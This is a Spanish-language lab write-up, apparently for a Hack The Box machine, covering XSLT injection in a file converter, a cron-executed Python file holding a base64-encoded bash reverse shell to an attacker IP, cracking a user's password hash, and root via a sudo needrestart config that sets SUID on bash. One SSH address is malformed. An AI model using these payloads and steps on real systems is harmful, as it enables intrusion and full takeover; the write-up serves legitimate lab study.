Enumeración web#

Una vez entramos a la web vemos que tenemos un panel de login, pero podemos registrarnos, así que nos registramos y entramos a la página web.

Dentro de la página web tenemos un conversor de archivos XML + XSLT a archivos HTML. Además podemos ver que es un proyecto open-source y nos dan el código de la página web.

Analizando el código#

XSLT Injection - Vendor and Version#

Vamos a probar a hacer una inyección de código para sacar la información de la tecnología que esta corriendo.

Creamos el xslt con el cual sacaremos el vendor y la versión para comprobar que la vulnerabilidad funciona (ademas tenemos que crear un XML dummy para poder enviar el archivo):

Entonces enviamos ambos archivos con curl:

curl -X POST http://conversor.htb/convert -F "xml_file=@data.xml" -F "xslt_file=@malicius.xslt" -H "Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImJvcmh1YiJ9.aP5Efw.50DW_Ms6NOxLfam2XA5uw2P3URw"

Y obtenemos la siguiente salida en el archivo .html generado, en la cual vemos la version y el vendor que se esta usando:

Entonces volviendo a revisar el código del proyecto, en el archivo install.md vemos que existe un crontab que ejecuta los archivos .py en la ruta /var/www/conversor.htb/scripts/.

Acceso Inicial#

Write Files with EXSLT Extension#

Entonces lo que vamos a probar es a inyectar nuestro propio archivo .py malicioso para que el crontab lo ejecute.

Vamos a usar como plantilla el ejemplo de write files de swisskyrepo añadiendo nuestro payload. https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#write-files-with-exslt-extension

import os;os.system("printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDMvMTIzNCAwPiYx |base64 -d |bash")

Probamos a subir el archivo y vemos que se ha enviado correctamente.

curl -X POST http://conversor.htb/convert -F "xml_file=@data.xml" -F "xslt_file=@malicius.xslt" -H "Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImJvcmh1YiJ9.aP5Efw.50DW_Ms6NOxLfam2XA5uw2P3URw"

Movimiento Lateral#

Una vez con la shell buscamos movernos a un usuario con mayores privilegios, entonces anteriormente habíamos visto la existencia de la base de datos /var/www/conversor.htb/instance/user.db.

Nos la descargamos y usando Sqlite3 buscamos los hashes de los usuarios:

SELECT * FROM users;

Ahora usando CrackStation crackeamos el hash obtenido y descubrimos la contraseña de nuestro siguiente usuario.

fismathack:Keepmesafeandwarm

Escalada de Privilegios#

ssh fismathack@10.10.129.222.201

Si ahora hacemos sudo -l vemos que el usuario fismathack tiene permiso para ejecutar el binario needrestart como root sin proporcionar la contraseña.

sudo -l

Needrestart lo que nos permite es reiniciar el demonio (daemon) para poder actualizar las librerías.

Mirando las opciones, veo que tenemos una opción que puede ser interesante ya que nos permite añadir un archivo arbitrario como archivo de configuración.

Entonces primero me creo el archivo que nos permitirá añadirle permisos SUID a el archivo /bin/bash.

system('chmod +s /bin/bash');

Entonces ejecutamos el binario indicando el archivo de configuración con -c. Si comprobamos los permisos de bash, vemos que se le a agregado permisos SUID.

sudo /usr/sbin/needrestart -c root.sh

Ahora podemos ejecutar la opción -p de bash para que nos de la shell como root.

/bin/bash -p
